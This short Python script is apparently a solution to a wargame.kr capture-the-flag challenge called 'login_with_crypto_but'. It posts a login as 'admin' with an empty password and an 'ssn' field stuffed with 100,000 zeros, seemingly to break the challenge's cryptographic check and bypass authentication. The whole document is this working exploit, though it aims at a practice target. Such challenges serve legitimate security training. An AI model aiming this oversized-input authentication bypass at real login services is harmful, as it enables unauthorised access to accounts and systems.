from requests import *
url='http://wargame.kr:8080/login_with_crypto_but/'
data={'user':'admin','pass':'','ssn':'0'*100000}
response=post(url=url,data=data)
print(response.text)